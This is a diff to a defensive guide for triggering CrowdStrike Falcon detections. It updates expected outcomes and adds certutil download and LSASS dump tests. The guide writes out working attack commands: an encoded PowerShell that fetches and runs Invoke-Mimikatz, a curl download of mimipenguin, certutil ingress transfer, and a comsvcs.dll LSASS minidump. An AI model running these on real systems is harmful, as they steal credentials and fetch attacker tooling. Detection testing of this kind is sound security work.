@@ -31,13 +31,15 @@ In the Falcon console, go to **Endpoint security** > **Monitor** > **Endpoint de
 | [EICAR test file](#eicar-test-file) | Windows, Linux | Informational | Detect | Execution | Malware, antivirus, NGAV, AV replacement, file download, file write |
 | [Falcon Intel indicator](#falcon-intel-indicator-domain) | Windows, Linux | High | Detect | Falcon Intel | Threat intel, IOC, malicious domain, DNS, adversary, intelligence |
 | [Suspicious CLI command](#suspicious-cli-command) | Linux | High | Detect | Execution | Command line, shell, living off the land, Linux server |
-| [Ingress tool transfer: mimipenguin](#ingress-tool-transfer-mimipenguin) | Linux | High | Detect | Command and Control | Tool download, curl, attacker tooling, Credential theft |
+| [Ingress tool transfer: mimipenguin](#ingress-tool-transfer-mimipenguin) | Linux | High | Killed | Command and Control | Tool download, curl, attacker tooling, Credential theft |
 | [Ingress tool transfer: PEASS](#ingress-tool-transfer-peass) | Linux | High | Killed | Command and Control | Prevention, privilege escalation, linpeas, tool download, kill process |
 | [DNS exfiltration](#dns-exfiltration) | Linux | High | Detect | Exfiltration | Exfiltration, data theft, DLP, DNS tunneling |
 | [Automated collection](#automated-collection) | Linux | High | Detect | Collection | Account discovery, staging data, passwd, Linux server |
-| [Ransomware file rename](#ransomware-file-rename) | Linux | High | Detect | Impact | Ransomware, LockBit, encryption, impact |
+| [Ransomware file rename](#ransomware-file-rename) | Linux | High | Killed | Impact | Ransomware, LockBit, encryption, impact |
 | [PowerShell exploit kit](#powershell-exploit-kit) | Windows | High | Blocked | Execution | Prevention, fileless, in-memory, mimikatz, encoded PowerShell, Credential theft |
 | [Credential dumping: Chrome logins](#credential-dumping-chrome-logins) | Windows | Critical | Blocked | Credential Access | Credential theft, browser passwords, infostealer, Prevention, living off the land |
+| [Ingress tool transfer: certutil](#ingress-tool-transfer-certutil) | Windows | High | Blocked | Command and Control | Prevention, living off the land, tool download, certutil, LOLBin |
+| [Credential dumping: LSASS](#credential-dumping-lsass) | Windows | Critical | Blocked | Credential Access | Credential theft, LSASS, comsvcs, minidump, Prevention |
 | [Sensor tamper attempt](#sensor-tamper-attempt) | Windows | High | Blocked | Defense Evasion | Tamper protection, anti-tamper, uninstall protection, Prevention |
 | [Custom IOA rule](#custom-ioa-rule) | Windows | Your choice | Blocked | Custom IOA | Custom rules, application control, block an app, Prevention, policy |
 | [ShadowHashData credential theft](#shadowhashdata-credential-theft) | macOS | High | Blocked | Credential Access | Credential theft, password hash, Mac, Prevention |
@@ -46,7 +48,7 @@ In the Falcon console, go to **Endpoint security** > **Monitor** > **Endpoint de
 | [Container: credential dumping](#container-credential-dumping) | Container | High | Detect | Credential Access | Containers, Kubernetes, Credential theft, mimipenguin |
 | [Container: automated collection](#container-automated-collection) | Container | High | Detect | Collection | Containers, Kubernetes, account discovery, staging data |
 | [Container: DNS exfiltration](#container-dns-exfiltration) | Container | High | Detect | Exfiltration | Containers, Kubernetes, Exfiltration, data theft, DNS tunneling |
-| [Container: ransomware file rename](#container-ransomware-file-rename) | Container | High | Detect | Impact | Containers, Kubernetes, Ransomware, LockBit, encryption |
+| [Container: ransomware file rename](#container-ransomware-file-rename) | Container | High | Killed | Impact | Containers, Kubernetes, Ransomware, LockBit, encryption |
 | [Container: drift](#container-drift) | Container | Medium | Detect | Container Drift | Containers, Kubernetes, drift, immutable containers, runtime protection |
 | [Container: web shell terminal spawn](#container-web-shell-terminal-spawn) | Container | High | Detect | Persistence | Containers, Kubernetes, Web apps, web shell, command injection, PHP |
 | [Container: unexpected child of web service](#container-unexpected-child-of-web-service) | Container | High | Detect | Execution | Containers, Kubernetes, Web apps, command injection, database dump |
@@ -77,7 +79,7 @@ In the Falcon console, go to **Endpoint security** > **Monitor** > **Endpoint de
 
 <div data-choice="os:windows">
 
-Run each in Command Prompt:
+Run each in **Command Prompt** (not PowerShell, where `cmd` opens a nested shell instead of running the command once):
 
 ```bat
 cmd crowdstrike_test_critical
@@ -376,7 +378,7 @@ Download the script:
 curl -L https://raw.githubusercontent.com/huntergregal/mimipenguin/refs/heads/master/mimipenguin.py
 ```
 
-> **Look for:** Tactic **Command and Control via Ingress Tool Transfer**, with the `curl` command line as the triggering indicator.
+> **Look for:** Tactic **Command and Control via Ingress Tool Transfer**, IOA `CurlWgetMalwareDownload`, with the `curl` command line as the triggering indicator. With a prevention policy that enables it (such as Phase 3 - optimal protection), the `curl` process is **killed**; otherwise it is only detected.
 
 Remove dependencies:
 
@@ -554,7 +556,7 @@ rm -f /tmp/passwords
 mkdir -p /tmp/cs-test && echo "fake data" > /tmp/cs-test/fakedata.txt && mv /tmp/cs-test/fakedata.txt /tmp/cs-test/fakedata.txt.lockbit
 ```
 
-> **Look for:** Severity **High**, tactic **Impact via Data Encrypted for Impact**.
+> **Look for:** Severity **High**, tactic **Impact via Data Encrypted for Impact**. With a prevention policy that enables it (such as Phase 3 - optimal protection), the process is **killed**; otherwise it is only detected.
 
 Clean up:
 
@@ -582,11 +584,15 @@ rm -rf /tmp/cs-test
 
 > **What & Why:** A hidden, policy-bypassing PowerShell that downloads and runs `Invoke-Mimikatz` in memory is a textbook fileless attack. The Base64 payload decodes to `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz`.
 
-```bat
+Run it from a **PowerShell** window:
+
+```powershell
 powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA==
 ```
 
-> **Look for:** Severity **High**, action **Operation blocked**, IOA name `PShellExploitKit2`, tactic **Execution via PowerShell** (T1059.001). Toggle **Show decoded** in the detection to see the decoded script.
+> **Look for:** Severity **High**, action **Operation blocked**, IOA name `PShellExploitKit2`, tactic **Execution via PowerShell** (T1059.001). Toggle **Show decoded** in the detection to see the decoded script. Follow-on `Windows Multiscript` detections for the same process are normal.
+
+> **Heads-up:** Launched from Command Prompt instead, the same command is only detected (`PShellBase64`), not blocked.
 
 </details>
 
@@ -598,6 +604,8 @@ powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAI
 </summary>
 
 > **What & Why:** Using the built-in `esentutl.exe` to copy Chrome's saved-password database is a known credential-theft technique that avoids dropping a custom tool.
+
+> **Note:** This sample is meant for Windows endpoints (workstations), not Windows Server, since Chrome is rarely used on servers.
 
 Install Chrome, then open and close it once so its `Login Data` file exists:
 
@@ -623,6 +631,50 @@ Uninstall Chrome:
 
 ```bat
 winget uninstall -e --id Google.Chrome
+```
+
+</details>
+
+<details class="detection-card">
+<summary>
+
+### Ingress tool transfer: certutil
+
+</summary>
+
+> **What & Why:** `certutil.exe` is a built-in Windows tool that attackers abuse to download files, so no custom malware is needed. The URL serves the harmless EICAR test file.
+
+Run from a **PowerShell** window:
+
+```powershell
+certutil -urlcache -split -f https://secure.eicar.org/eicarcom2.zip C:\Windows\Temp\cu-test.zip
+```
+
+> **Look for:** Severity **High**, action **Process blocked**, IOA name `CertutilRemoteFileCopy`, tactic **Command and Control via Ingress Tool Transfer**. An `Anomalous process execution` (AI Powered IOA, Medium) detection usually follows. `certutil` returns `Access is denied`.
+
+</details>
+
+<details class="detection-card">
+<summary>
+
+### Credential dumping: LSASS
+
+</summary>
+
+> **What & Why:** LSASS holds credentials in memory, and dumping it with the built-in `comsvcs.dll` is a classic attack that avoids dropping a tool like Mimikatz.
+
+> **Warning:** Run from an elevated (Administrator) **PowerShell** window. If your policy does not block it, a real LSASS dump file is written, so delete it after the test.
+
+```powershell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\ls-test.dmp full
+```
+
+> **Look for:** Severity **Critical**, action **Process blocked**, IOA names `CredDump` (blocked) and `CredDumpTool` (detect), tactic **Credential Access via OS Credential Dumping** (T1003). No dump file is created.
+
+Clean up (only needed if the file exists):
+
+```powershell
+Remove-Item C:\Windows\Temp\ls-test.dmp -ErrorAction SilentlyContinue
 ```
 
 </details>
@@ -844,7 +896,7 @@ sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bi
 sudo docker run --rm quay.io/crowdstrike/detection-container "bash /home/eval/bin/Impact_via_Data_Encrypted_for_Impact.sh"
 ```
 
-> **Look for:** Severity **High**, tactic **Impact via Data Encrypted for Impact**.
+> **Look for:** Severity **High**, tactic **Impact via Data Encrypted for Impact**. With a prevention policy that enables it (such as Phase 3 - optimal protection), the process is **killed**; otherwise it is only detected.
 
 </details>
 
